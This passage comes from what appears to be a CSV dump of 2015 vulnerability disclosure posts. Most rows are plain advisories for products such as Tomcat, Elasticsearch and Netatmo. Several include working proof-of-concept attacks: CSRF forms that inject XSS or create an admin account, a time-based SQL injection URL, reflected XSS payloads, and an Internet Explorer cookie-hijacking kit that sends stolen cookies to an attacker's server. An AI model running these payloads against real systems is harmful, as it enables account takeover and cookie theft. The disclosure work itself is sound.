<input type=""hidden"" name=""option&#95;page"" value=""image&#95;metadata&#95;cruncher&#95;title"" />
<input type=""hidden"" name=""action"" value=""update"" />
<input type=""hidden"" name=""&#95;wpnonce"" value=""0061596f3e"" />
<input type=""hidden"" name=""&#95;wp&#95;http&#95;referer"" value=""&#47;wordpress&#47;wp&#45;admin&#47;plugins&#46;php&#63;page&#61;image&#95;metadata&#95;cruncher&#45;options"" />
<input type=""hidden"" name=""option&#95;page"" value=""image&#95;metadata&#95;cruncher&#95;alt"" />
<input type=""hidden"" name=""action"" value=""update"" />
<input type=""hidden"" name=""&#95;wpnonce"" value=""d3134676c2"" />
<input type=""hidden"" name=""&#95;wp&#95;http&#95;referer"" value=""&#47;wordpress&#47;wp&#45;admin&#47;plugins&#46;php&#63;page&#61;image&#95;metadata&#95;cruncher&#45;options"" />
<input type=""hidden"" name=""image&#95;metadata&#95;cruncher&#91;enable&#95;highlighting&#93;"" value=""enable"" />
<input type=""hidden"" name=""image&#95;metadata&#95;cruncher&#91;title&#93;"" value=""&#123;&#32;IPTC&#58;Headline&#32;&#125;"" />
<input type=""hidden"" name=""image&#95;metadata&#95;cruncher&#91;alt&#93;"" value=""&lt;script&gt;alert&#40;&quot;1&quot;&#41;&lt;&#47;script&gt;"" />
<input type=""hidden"" name=""image&#95;metadata&#95;cruncher&#91;caption&#93;"" value=""alert&#40;&quot;1&quot;&#41;"" />
<input type=""hidden"" name=""image&#95;metadata&#95;cruncher&#91;description&#93;"" value=""&#123;&#32;IPTC&#58;Caption&#32;&#124;&#32;EXIF&#58;ImageDescription&#32;&#125;"" />
<input type=""hidden"" name=""submit"" value=""Save&#32;Changes"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
Next time when u navigate to page you will see XSS in action cheers ;)
Mitigation:
Developer will fix this in next realese.
# Disclosure:
1-feb-2015 Repoerted to Developer
2-Feb-2015 Acknodlagement from Developer
8-feb-2015 Ask update from developer
13-feb-2015 Inform developer about Public discloser with confirmation of patching this in next realese
14-feb-2015 Inform to Bugtraq,Public Disclose
17-feb-2015 Reposting with cve and csrf POC
#credits:
Kaustubh Padwad
Information Security Researcher
kingkaustubh me com
https://twitter.com/s3curityb3ast
http://breakthesec.com
https://www.linkedin.com/in/kaustubhpadwad"
5359,[CVE-2015-1585] Fat Free CRM - CSRF Vulnerability in Version 0.13.5,,CVE-2015-1585,"[CVE-2015-1585] Fat Free CRM - CSRF Vulnerability in Version 0.13.5
----------------------------------------------------------------
Product Information:
Software: Fat Free CRM
Tested Version: 0.13.5, released 22.1.2015 with over 10.000 downloads
Vulnerability Type: Cross-Site Request Forgery, CSRF (CWE-352)
Download link: https://rubygems.org/gems/fat_free_crm/versions/0.13.5
Description: An open source, Ruby on Rails customer relationship management platform (CRM). Out of the box it features group collaboration, campaign and lead management, contact lists, and opportunity tracking (copied from https://github.com/fatfreecrm/fat_free_crm)
----------------------------------------------------------------
Vulnerability description:
When an authenticated administrative user of Fat Free CRM is creating another user account, the following POST request is sent to the server:
POST /admin/users HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-CSRF-Token: oxZgwOAtzNdFJU85jPqmI+g893lQaOy6ctCCzef42qI=
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://127.0.0.1:3000/admin
Content-Length: 356
Cookie: _session_id=$foo1; user_credentials=$foo2
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
utf8=%E2%9C%93&authenticity_token=oxZgwOAtzNdFJU85jPqmI%2Bg893lQaOy6ctCCzef42qI%3D&user%5Busername%5D=admin1&user%5Bemail%5D=test1%40test.de&user%5Bpassword%5D=1&user%5Bpassword_confirmation%5D=1&user%5Badmin%5D=0&user%5Badmin%5D=1&user%5Bfirst_name%5D=&user%5Blast_name%5D=&user%5Btitle%5D=&user%5Bcompany%5D=&user%5Bgroup_ids%5D%5B%5D=&commit=Create+User
As can be seen, the application is already using a CSRF token in the parameter authenticity_token, that has got a sufficient entropy. Nevertheless, this parameter is optional and not mandatory when creating a user. When executing the following Proof-of-Concept, a new administrative user called ""attacker"" will be created with the password 1234.
<html>
<body>
<form action=""http://127.0.0.1:3000/admin/users"" method=""POST"">
<input type=""hidden"" name=""utf8"" value=""&#65533;&#156;&#147;"" />
<input type=""hidden"" name=""user&#91;username&#93;"" value=""attacker"" />
<input type=""hidden"" name=""user&#91;email&#93;"" value=""test&#64;test&#46;org"" />
<input type=""hidden"" name=""user&#91;password&#93;"" value=""1234"" />
<input type=""hidden"" name=""user&#91;password&#95;confirmation&#93;"" value=""1234"" />
<input type=""hidden"" name=""user&#91;admin&#93;"" value=""1"" />
<input type=""hidden"" name=""commit"" value=""Create&#32;User"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
----------------------------------------------------------------
Impact:
Every state changing operation within Fat Free CRM is using the parameter authenticity_token in order to prevent CSRF attacks. Nevertheless, all operations can be triggered by a CSRF attack, as this parameter is always optional and not needed.
----------------------------------------------------------------
Solution:
Update to the latest version, which is 0.13.6, see https://rubygems.org/gems/fat_free_crm/versions/0.13.6
See also https://github.com/fatfreecrm/fat_free_crm/wiki/CSRF-Vulnerability-%28CVE-2015-1585%29
----------------------------------------------------------------
Timeline:
Vulnerability found: 11.2.2015
Vendor informed: 11.2.2015
Response by vendor: 12.2.2015
Fix by vendor 12.2.2015
Public Advisory: 14.2.2015
----------------------------------------------------------------
Best regards,
Sven Schleier"
5360,CVE-2015-1593 - Linux ASLR integer overflow: Reducing stack entropy by four,,CVE-2015-1593,"Hi,
A bug in Linux ASLR implementation for versions prior to 3.19-rc3 has
been found. The issue is that the stack for processes is not properly
randomized on some 64 bit architectures due to an integer overflow.
Affected systems have reduced the stack entropy of the processes by four.
Details at:
http://hmarco.org/bugs/linux-ASLR-integer-overflow.html
Regards,
Hector Marco.
http://hmarco.org"
5361,CVE-2015-1600 - Netatmo Weather Station Cleartext Password Leak,,CVE-2015-1600,"Summary
During initial setup, the weather station will submit its complete configuration unencrypted to the manufacturer cloud service. This configuration includes confidential information like the user's Wifi password.
The problem has been fixed by removing this configuration dump from current firmware versions.
CVE: CVE-2015-1600.
Affected Systems: Netatmo Indoor Module firmware 100 and earlier.
Additional Details: https://isc.sans.edu/forums/diary/Did+You+Remove+That+Debug+Code+Netatmo+Weather+Station+Sending+WPA+Passphrase+in+the+Clear/19327/
Manufacturers web site: www.netatmo.com
Patch: Affected systems will download updated firmware automatically from Netatmo's cloud service."
5364,CVE-2015-1574 - Google Email App 4.2.2 remote denial of service,,CVE-2015-1574,"Hello,
Summary:
A bug in the stock Google email application version 4.4.2.0200 has been found. An attacker can remotely perform an Denial Of Service attack by sending a specially crafted email. No interaction from the user is needed to produce the crash just receive the malicious email.
The CVE-2015-1574 has been assigned. Version 4.2.2.0200 running on a Samsung Galaxy 4 mini fully updated (19 Jan 2015) is affected. Newer versions 4.2.2.0400 are not affected.
Details and proof of concept exploit at:
http://hmarco.org/bugs/google_email_app_4.2.2_denial_of_service.html
Regards,
Hector Marco.
http://hmarco.org"
5376,Elasticsearch vulnerability CVE-2015-1427,,CVE-2015-1427,"Summary:
Elasticsearch versions 1.3.0-1.3.7 and 1.4.0-1.4.2 have vulnerabilities in the Groovy scripting engine. The vulnerabilities allow an attacker to construct Groovy scripts that escape the sandbox and execute shell commands as the user running the Elasticsearch Java VM.
We have been assigned CVE-2015-1427 for this.
Fixed versions:
Versions 1.3.8 and 1.4.3 disable sandboxing for Groovy by default. As a consequence, dynamic script execution is disabled for Groovy.
Remediation:
Users should upgrade to 1.3.8 or 1.4.3. Users that do not want to upgrade can address the vulnerabilities by setting script.groovy.sandbox.enabled to false in elasticseach.yml and restarting the node.
Also, we have published a procedure for moving trusted Groovy dynamic scripts to disk so that users can continue their use, even with Groovy dynamic scripting disabled. This will require a small client change from the user.
Credit:
We received two reports of similar issues, one from the Cisco Systems Information Security Team and one from Cameron Morris.
CVSS:
Overall CVSS score: 5.8"
5402,[SECURITY] CVE-2014-0227 Apache Tomcat Request Smuggling,,CVE-2014-0227,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-0227 Request Smuggling
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 8.0.0-RC1 to 8.0.8
- - Apache Tomcat 7.0.0 to 7.0.54
- - Apache Tomcat 6.0.0 to 6.0.41
Description:
It was possible to craft a malformed chunk as part of a chucked request
that caused Tomcat to read part of the request body as a new request.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 8.0.9 or later
- - Upgrade to Apache Tomcat 7.0.55 or later
- - Upgrade to Apache Tomcat 6.0.43 or later
(6.0.42 contains the fix but was not released)
Credit:
This issue was identified by the Tomcat security team.
References:
[1] http://tomcat.apache.org/security-8.html
[2] http://tomcat.apache.org/security-7.html
[3] http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
iQIcBAEBAgAGBQJU2HoOAAoJEBDAHFovYFnn/3wP/A3qNw/M6hrPYGtZJGtHmb3b
B7VMHvhW18nTVUIuS6pg/FIcLg//dRpzzosHGAygGZJRTqW6am3TF9IEGrtaqXED
3cLbIUcIlay8grokG5Ci4fduZ3pouVA8/xbWTW6ND0KORAAsCeeIVVs3+/IdyBrM
hRMST00A/ryXEBCzUdVATjd7bpdOAnRW/lSUI5/Ap+zQN1SR6rBdF224UaWRiZrr
4t55ZnStDQ10OT5a8R/uSZAftnRD3wRzOCquYHA7PbzpjDDmwbz00BQWErmlmgs/
ElN9Dmdn+/dFaaU9AGOLEhsse3KajfjgdWVXRoB2BJW3/GFgPT9vcHswINEgAZtp
HoNFavmlZr0bs+1YdSEx8qtitB6Wr4QiwWYzfwLMhZ3qx6g0NSTMY6g+JH7BVIOL
3xGf1B42LidgMqqpcyddLW3HFICRI6wX1IgK+rF8Obaga6UOCHgmCKTL4YBxe5XK
+YqEgH3HE1jwTL04FGsVMSAUIx4Z5wkm0rXsf3emHsyDytFQOyrJqI8AdGVMyOwO
ZEjqwFDCjW36I2YsoE4HffO/ZnTxJrZzOZOXXt7N7zfFfxXsJsSuBBM3il0VIPyB
AdmOl1RoeGx5Gj2WGIgXjPLCcOHaNTobClasFMvuzgPmxIHPViT1fhM/M41cre8M
v3iXCWFfOe15UtdBy57w
=BK1a
-----END PGP SIGNATURE-----"
5403,Cookie hijacking: Internet Explorer UXSS (CVE-2015-0072),,CVE-2015-0072,"Cookie hijacking: Internet Explorer UXSS (CVE-2015-0072)
Host below files on webserver (attacker.com) and share the exploit link with victims,
exploit.php --- exploit link (Share with victim)
redirect.php --- Script to redirect on target page (target page should not contain X-Frame-Options or it will fail)
delay.php --- Script to add delay
collector.php --- Script to collect hijacked cookie
log.txt --- Collected cookies will be stored in this text file
-------------------------------------exploit.php-----------------------------------
<iframe src=""redirect.php"" style=""display:none""></iframe>
<iframe src=""https://target.com/"" style=""display:none""></iframe>
<script>
                                                                                                                                                                                                                                   
</script>
--------------------------------------------------------------------------------------
-------------------------------------redirect.php-----------------------------------
<?php
header(""Location: https://target.com/"");
exit();
?>
--------------------------------------------------------------------------------------
-------------------------------------delay.php-----------------------------------
<?php
sleep(15);
echo 'Bhdresh';
exit();
?>
--------------------------------------------------------------------------------------
-------------------------------------collector.php-----------------------------------
<?php
$f = fopen(""log.txt"", 'a');
fwrite($f, $_SERVER[""REQUEST_URI""]."" "");
fclose($f);
header(""Location: http://www.youtube.com/"");
?>
--------------------------------------------------------------------------------------
-------------------------------------log.txt-----------------------------------
- Create a file as log.txt and modify the permissions (chmod 777 log.txt)
--------------------------------------------------------------------------------------
Demo: facabook.net16.net/exploit.php
Reference: http://innerht.ml/blog/ie-uxss.html"
5421,LG On Screen Phone authentication bypass (CVE-2014-8757),,CVE-2014-8757,"LG On Screen Phone authentication bypass vulnerability
------------------------------------------------------
SEARCH-LAB Ltd. discovered a serious security vulnerability in the On
Screen Phone protocol used by LG Smart Phones. A malicious attacker is
able to bypass the authentication phase of the network communication,
and thus establish a connection to the On Screen Phone application
without the owner’s knowledge or consent. Once connected, the attacker
could have full control over the phone – even without physical access to
it. The attacker needs only access to the same local network as the
phone is connected to, for example via Wi-Fi.
What is LG On Screen Phone?
---------------------------
The LG On-Screen Phone application (OSP) makes it easy to access and
control LG’s Android smartphones through a PC. The connection can be
established either by using an USB cable or wirelessly through Wi-Fi or
Bluetooth. When attempting to connect to the phone via OSP, a popup
dialog is displayed on the phone and it is to be confirmed and accepted
by the owner. Once the channel is established, the screen contents of
the device are being transmitted to the PC as a motion stream, mouse
clicks on the PC are turned into touch events on the phone. By using OSP
one can control an LG Smart Phone just like it was in their hands.
CVE
---
The ID CVE-2014-8757 was assigned to this vulnerability.
Affected Versions
-----------------
LG On Screen Phone v4.3.009 (inclusive) and older versions of the
application are vulnerable. This vulnerability was fixed in LG OSP v4.3.010
Most smart phone models of LG are affected and the OSP application is
even preinstalled, and there is no option to uninstall or stop it. On
newer models, like G3 the OSP application is not preinstalled anymore.
Technical details
-----------------
The vulnerable code resides in the On Screen Phone component:
shell@geehrc:/ $ps |grep osp
system 1411 303 559616 44504 ffffffff 00000000 S com.lge.osp
It is started automatically on boot and there is no way in the system
settings to turn it off.
The process is listening on 0 0.0.0.0:8382:
shell@geehrc:/ $ netstat -nap|grep 8382
netstat -nap|grep 8382
tcp 0 0 0.0.0.0:8382 0.0.0.0:* LISTEN
The LG On Screen Phone client software running on PC connects to this
TCP port. After receiving the initial banner, the client sends the
following binary message to the server running on the phone:
00000000 18 00 1c 96 dd 82 c2 31 0a 0d 5a dc 05 2a 23 f4 .......1 ..Z..*#.
00000010 21 a5 d3 02 01 00 00 34 33 30 39 30 !......4 3090
This message triggers the confirmation dialog on the phone asking the
user whether they wanted to allow this connection. If the user hits
cancel, the phone server sends a response with a negative message to the
client and then closes the TCP connection immediately.
However, the server process does not require this message to be sent
before serving another requests, like initiating the video stream or
submitting files, handling key/touchscreen events, notifications. Using
a modified client it is possible to connect to the phone without the
confirmation dialog being displayed on the phone.
The attacker has full control over the phone.
Timeline
--------
SEARCH-LAB Ltd. responsibly reported this threat to the manufacturer in
September 2014 who confirmed the severity of the issue and started
working on the fix in turn. The patched version of the application is
now available to download through LG’s Update Center and/or will be
available in form of Maintenance Release for some models. LG smartphone
users should make sure to have at least version 4.3.010 of the On Screen
Phone (OSP) application installed. Please note that when OSP is
pre-installed, the device is vulnerable by default – OSP is started
automatically and cannot be disabled in Settings.
Links
-----
https://www.youtube.com/watch?v=Wd8XydalVas
https://github.com/irsl/lgosp-poc/"
5430,CVE-2015-1172 Wordpress-theme remote arbitrary code,,CVE-2015-1172,"Product: holding_pattern
Vendor: Liftux
Vulnerable Version(s): 0.6 and prior
Tested Version: 0.6
Advisory Publication: January 18, 2015
Vendor Notification: January 14, 2015
Public Disclosure: January 18, 2015
Vulnerability Type: Exec Code
Authentication: Not required to exploit
CVE Reference: CVE-2015-1172
Risk Level: Medium
CVSSv2 Base Score: 5.8 (AV:N/AC:M/Au:N/C:P/I:P/A:N)
Solution Status: Solution Unavailable, Product EOL
Discovered and Provided: Alexander Borg ( http://www.servernet.se )
-----------------------------------------------------------------------------------------------
Advisory Details:
The holding_pattern Wordpress-theme is prone to a vulnerability that allows attackers to upload arbitrary files. The application uses limited validation which means unauthorized upload is allowed.
An attacker can exploit this vulnerability to upload arbitrary PHP code and run it in the context of the Web server process. This may facilitate unauthorized access or privilege escalation.
-----------------------------------------------------------------------------------------------
Solution:
Disclosure timeline:
2015-01-14 Vendor Alerted via email.
2015-01-14 Fix Requested via email.
2015-01-14 Vendor made clear no patch will be available.
2015-01-18 Public disclosure.
Currently we are not aware of any official solution for this vulnerability. Product is EOL and no security fixes will be made available.
Temporary solution may be to remove the file admin/upload-file.php
-----------------------------------------------------------------------------------------------
Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible."
5433,Re: Re: CVE-2015-1437 XSS In ASUS Router.,,CVE-2015-1437,"Here is the exact conversation
ASUS CASEID=RTM20150115204498-295 Please click here if you wish to reply this mail!
Dear Kaustubh,
Thank you for the information, we really appreciate your feedback.
To improve our customers experience we have forwarded your information to related dept., the concerned dept.
Wish you a nice day!
Thanks and Regards,
Mathew M.
Asus Customer Service.
---------- Original Message ----------
From : kingkaustubh icloud com
Sent : 15-Jan-15 6:49:07 PM
To : ""techsupport asus com""
Subject : Re: Re:Re:<TSD> Satisfaction-IND(EN) : Security vulnerability in this router [ID=RTM20150109203637-986]
[CASEID=TM20150115204498]
Dear Mathew
Please find attached for the XSS without authentication BUG attached is the POC for
the same
as mention in Portal reply :)
On Jan 11, 2015, at 11:05 PM, mathew_m wrote:
ASUS CASEID=RTM20150109203637-986
Dear Kaustubh,
We apologize for any inconvenience that has been caused in reply to your email and
we really appreciate your feedback.
To improve our customers experience we have forwarded your information to related
dept., the concerned dept. would contact you for further assistance.
Wish you a nice day!
Thanks and Regards,
Mathew M.
Asus Customer Service.
---------- Original Message ----------
From : kingkaustubh icloud com
Sent : 09-Jan-15 6:19:10 PM
To : ""techsupport asus com""
Subject : Re: Satisfaction-IND(EN) : Security vulnerability in this router
[ID=RWTM20150109014017580-918]
[CASEID=TM20150109203637]
Dear Mathew M.,
This is for information security department and developer who develop the firmware
for ASUS router,
Issue
The value of the flag request parameter is copied into a JavaScript string which is
encapsulated in single quotation marks. The payload 78846';alert(1337)//372137b5d
was submitted in the flag parameter. This input was echoed unmodified in the
application's response.
Please find attached POC for the details of concept and Please revert on priority and
register a CVE ID for Same, I am planing to submit the same to
https://forms.cert.org/VulReport/ for making this Public once got confirmation from
your side
On Jan 09, 2015, at 01:54 AM, mathew_m wrote:
ASUS CASEID=RWTM20150109014017580-918
Dear Kaustubh,
Thank you for contacting ASUS technical support.
We request you to please help us with more details of the issue so that we could
forward your details to the concerned dept.
Do let us know if you face any doubts or queries.
Thanks and Regards,
Mathew M.
Asus India support team.
---------- Original Message ----------
From : kingkaustubh me com
Sent : 08-Jan-15 5:40:17 PM
To : ""techsupport asus com""
Subject : Satisfaction-IND(EN) : Security vulnerability in this router
[CASEID=WTM20150109014017580]
Apply date : 2015/01/08 17:40:17(UTC Time)
[Contact Information]
Name : Kaustubh Padwad
Email Address : kingkaustubh me com
Phone Number : 9186001461111
Country : India[&#2349;&#2366;&#2352;&#2340; &#2327;&#2339;&#2352;&#2366;&#2332;&#2381;&#2351; ]
[Product Information]
Product Type : Wireless
Product Model : RT-N10 Plus
Product S/N : CAISNE001110
[Comment]
Subject : Security vulnerability in this router
Topic : 3. Others
Description :
Dear team,
I am kaustubh padwad security researcher from india, i found a security Vulnerability
in your product assus router N10Plus is vulnerable i don't know where to drop a mail
so kindly contact via email for full discloses.i just need a correct email address to
disclose the POC of vulnerability
Sent from my iPhone"
5435,Re: CVE-2015-1437 XSS In ASUS Router.,,CVE-2015-1437,"On Tue, Feb 03, 2015 at 04:54:26PM +0000, kingkaustubh me com wrote:
> 8-jan-2015 Repoerted to ASUS
> 9-jan-2015 Asus confirm that they reported to concern department
> 15-jan-2015 Ask for update from asus asus says reported to HQ
> 28-jan-2015 Ask asus about reporting security foucus No reply from ASUS
> 29-jan-2015 security focus bugtraq
Could you copy-paste their exact responses, thanks? I hope they did not say
""issue has been reported to concern department"". This probably affects other
firmwares as well.
--
Henri Salo"
5439,[CVE-2015-1467] Fork CMS - SQL Injection in Version 3.8.5,,CVE-2015-1467,"[CVE-2015-1467] Fork CMS - SQL Injection in Version 3.8.5
----------------------------------------------------------------
Product Information:
Software: Fork CMS
Tested Version: 3.8.5, released on Wednesday 14 January 2015
Vulnerability Type: SQL Injection (CWE-89)
Download link to tested version: http://www.fork-cms.com/download?release=3.8.5
Description: Fork CMS is dedicated to creating a user friendly environment to build, monitor and update your website. We take great pride in being the Content Management System of choice for beginners and professionals. We combine this grand vision with the latest technological innovations to allow developers, front-end developers and designers to build kick-ass websites. This makes Fork CMS next in line for world domination. (copied from http://www.fork-cms.com/features)
----------------------------------------------------------------
Vulnerability description:
When an authenticated user is navigating to ""Settings/Translations"" and is clicking on the button ""Update Filter"" the following GET-request is sent to the server:
http://127.0.0.1/private/en/locale/index?form=filter&form_token=408d28a8cbab7890c11b20af033c486b&application=&module=&type%5B%5D=act&type%5B%5D=err&type%5B%5D=lbl&type%5B%5D=msg&language%5B%5D=en&name=&value=
The parameter language[] is prone to boolean-based blind and stacked queries SQL-Injection. WIth the following payload a delay can be provoked in the request of additional 10 seconds:
http://127.0.0.1/private/en/locale/index?form=filter&form_token=68aa8d273e0bd95a70e67372841603d5&application=&module=&type%5B%5D=act%27%2b(select%20*%20from%20(select(sleep(10)))a)%2b%27&type%5B%5D=err&type%5B%5D=lbl&type%5B%5D=msg&language%5B%5D=en&name=&value=
Also the parameters type[] are prone to SQL-Injection.
----------------------------------------------------------------
Impact:
Direct database access is possible if an attacker is exploiting the SQL Injection vulnerability.
----------------------------------------------------------------
Solution:
Update to the latest version, which is 3.8.6, see http://www.fork-cms.com/download.
----------------------------------------------------------------
Timeline:
Vulnerability found: 3.2.2015
Vendor informed: 3.2.2015
Response by vendor: 3.2.2015
Fix by vendor 3.2.2015
Public Advisory: 4.2.2015
----------------------------------------------------------------
Best regards,
Sven Schleier"
5442,CVE-2015-1437 XSS In ASUS Router.,,CVE-2015-1437,"#####################################
Title:- Reflected XSS vulnarbility in Asus RT-N10 Plus router
Author: Kaustubh G. Padwad
Product: ASUS Router RT-N10 Plus
Firmware: 2.1.1.1.70
Severity: HIGH
Auth: Not requierd
CVE ID: CVE-2015-1437
# Description:
Vulnerable Parameter: flag=
# Vulnerability Class:
Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS))
# About Vulnerability: Asus Router RT-N10 Plus with firmware 2.1.1.70 is vulnarable for crosss site scripting attack,this may cause a huge network compemise.As this does not requierd any authentication this can be a mass network compermising.
#Technical Details: The value of the flag request parameter is copied into a JavaScript string which is encapsulated in single quotation marks. The payload initial78846%27%3balert(""Hacked_BY_S3curity_B3ast"")%2f%2f372137b5d was submitted in the flag parameter. This input was echoed unmodified in the application's response.
#Steps to Reproduce: (POC):
After setting up router
Enter this URL
1.http://router/error_page.htm?flag=initial78846%27%3balert(document.lastmodified)%2f%2f372137b5d
2.http://router/error_page.htm?flag=initial78846%27%3balert(""Hacked_BY_S3curity_B3ast"")%2f%2f372137b5d
# Disclosure:
8-jan-2015 Repoerted to ASUS
9-jan-2015 Asus confirm that they reported to concern department
15-jan-2015 Ask for update from asus asus says reported to HQ
28-jan-2015 Ask asus about reporting security foucus No reply from ASUS
29-jan-2015 security focus bugtraq
#credits:
Kaustubh Padwad
Information Security Researcher
kingkaustubh me com
https://twitter.com/s3curityb3ast
http://breakthesec.com
https://www.linkedin.com/in/kaustubhpadwad"
5444,CVE-2014-5360 Landesk Management Suite XSS (Cross-Site Scripting) Security Vulnerability,,CVE-2014-5360,"Exploit Title: Landesk Management Suite Cross-Site scripting vulnerabilityProduct: Landesk Management Suite
Vulnerable Versions: 9.5 (possible previous versions), 9.6
Tested Version: 9.5
Advisory Publication: Feb 02, 2015
Vulnerability Type: Cross-Site Scripting [CWE-79]
CVE Reference: CVE-2014-5360
Advisory Details:
(1) Vendor & Product Description
Vendor:LANDESK
Product & Version:Landesk Management Suite v9.5
Vendor URL & Download:http://www.landesk.com/products/management-suite/
Product Description:""Manage all your users� multi-platform desktops and mobile devices. Integrate several IT
disciplinesinto a single management experience that speeds software distribution, ensures software license compliance,
simplifies OS provisioning, saves power costs, provides secure remote control, and manages Mac OS X.""
(2) Vulnerability Details:
The admin interface of Landesk Management Suite can be exploited by
XSS attacks.
Proof of concept:URL: https://<LANDESK>/remote/serverlist_grouptree.aspx?AMTVersion=+alert(5)
Parameter name: AMTVersion
Parameter Type: GET
Attack Pattern: +alert(5)
(3) Advisory Timeline:
15/09/2014 - First Contact
19/12/2014 - Vulnerability fixed
02/02/2015 - Advisory released
(4)Solution:
Upgrade to version 9.6 SP1 which includes a fix for this vulnerability
(5) Credits:Alex Haynes
References:http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5360"
5450,[CVE-2014-9331] ManageEngine Desktop Central CSRF vulnerability to add an Admin user advisory,,CVE-2014-9331,"#####################################
Title:- Cross-Site Request Forgery (CSRF) Vulnerability in ManageEngine Desktop Central 9 Allows adding an Admin User
Author: Mohamed Idris - Help AG Middle East
Vendor: ZOHO Corp
Advisory ID: hag20141205
Product: ManageEngine Desktop Central 9
Version: All versions below build 90121
Tested Version: Version 9 Build 90087
Severity: HIGH
CVE Reference: CVE-2014-9331
Fix Link: http://www.manageengine.com/products/desktop-central/cve20149331-cross-site-request-forgery.html
# About the Product:
Desktop Central is an integrated desktop & mobile device management software that helps in managing the servers, laptops, desktops, smartphones and tablets from a central point.
It automates your regular desktop management routines like installing patches, distributing software, managing your IT Assets, managing software licenses, monitoring software usage statistics, managing USB device usage, taking control of remote desktops, and more. It supports managing both Windows and Mac operating systems.
# Description:
This Cross-Site Request Forgery vulnerability enables an anonymous attacker to add an admin account into the application. This leads to compromising the whole domain as the application normally uses privileged domain account to perform administration tasks.
# Vulnerability Class:
Cross-Site Request Forgery (CSRF) - https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29
# How to Reproduce: (POC):
Host the attached code in a webserver. Then send the link to the application Admin. The admin should be loggedin when he clicks on the link.
You can entice him to do that by using social engineering techniques ;)
Say for example: Log into the application and click the following link to get free licenses
# Disclosure:
Discovered: December 05, 2014
Vendor Notification: December 08, 2014
Advisory Publication: January 31, 2015
Public Disclosure: January 31, 2015
# Affected Targets:
All Desktop Central versions below build 90130. On all platforms (Actually platform doesn't affect the issue).
# Solution:
Upgrade to Build 90130 will fix this issue.
The update can be found at the following link: http://www.manageengine.com/products/desktop-central/cve20149331-cross-site-request-forgery.html
# credits:
Mohamed Idris
Senior Information Security Analyst and Team Leader
Help AG Middle East
# Proof of Concept Video:
https://www.youtube.com/watch?v=MRIZy7EBSF8
# Proof of Concept Code:
https://raw.githubusercontent.com/moha99sa/ManageEngine-Desktop-Central-CSRF/master/README.md
#References:
[1] help AG middle East http://www.helpag.com/.
[2] http://www.manageengine.com/products/desktop-central/
[3] http://www.manageengine.com/products/desktop-central/cve20149331-cross-site-request-forgery.html
[4] https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
[5] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures."
5474,CVE-2014-8779: SSH Host keys on Pexip Infinity,,CVE-2014-8779,"Summary
=======
The operating system used by Pexip Infinity does not create unique SSH
host keys on deployment of new Management and Conferencing Nodes, using
fixed host keys instead. Host keys are used to verify the identity of
the remote host when connecting to it over SSH. These keys are contained
in the publicly available software image.
An attacker with privileged network access may make use of these keys to
spoof the identity of a Pexip Infinity installation or conduct
man-in-the-middle attacks on administrative SSH sessions. This may
permit the attacker access to credentials used to authenticate sessions
over SSH and provide shell access to the affected systems.
This issue is resolved in Pexip Infinity version 8.
References
=========
CVE-2014-8779
http://pexip.com/security-bulletins"
5482,[CVE-2015-1394] Photo Gallery (Wordpress Plugin) - Multiple XSS Vulnerabilities Version 1.2.8,,CVE-2015-1394,"[CVE-2015-1394] Photo Gallery (Wordpress Plugin) - Multiple XSS Vulnerabilities Version 1.2.8
----------------------------------------------------------------
Product Information:
Software: Photo Gallery (Wordpress Plugin)
Tested Version: 1.2.8, released on 15.01.2015 and has over half a million downloads.
Vulnerability Type: Cross-site Scripting (CWE-79)
Download link to tested version: https://downloads.wordpress.org/plugin/photo-gallery.1.2.8.zip
Description: Photo Gallery is an advanced plugin with a list of tools and options for adding and editing images for different views. It is fully responsive. The product includes plugin for adding image galleries and albums to posts and pages, as well as multiple widgets. You can add images, providing detailed descriptions and tags, organize the galleries into different albums. (copied from https://wordpress.org/plugins/photo-gallery/)
----------------------------------------------------------------
Description of vulnerability:
When an authenticated user is uploading a picture to a gallery the following POST request is sent to the server:
POST /wordpress/wp-admin/admin-ajax.php?action=addImages&width=700&height=550&extensions=jpg,jpeg,png,gif&callback=bwg_add_preview_image& HTTP/1.1
Host: <IP>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: <Wordpress-Cookie>
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 484
importer_thumb_width=300&importer_thumb_height=300&importer_img_width=1200&importer_img_height=1200&upload_thumb_width=300&upload_thumb_height=300&upload_img_width=1200&upload_img_height=1200&files%5B%5D=&task=&extensions=jpg%2Cjpeg%2Cpng%2Cgif&callback=bwg_add_preview_image&sort_by=name&sort_order=asc&items_view=thumbs&dir=&file_names=&file_namesML=&file_new_name=&new_dir_name=&clipboard_task=&clipboard_files=&clipboard_src=&clipboard_dest=
The following parameters in the POST body are vulnerable to XSS:
- sort_by
- sort_order
- items_view
- dir
- clipboard_task
- clipboard_files
- clipboard_src
- clipboard_dest
The parameter sort_by can also be placed within the URL, all other parameters in the POST body can be deleted and the request method can be changed from POST to GET. Afterwards the following GET-request can be used to execute reflected XSS:
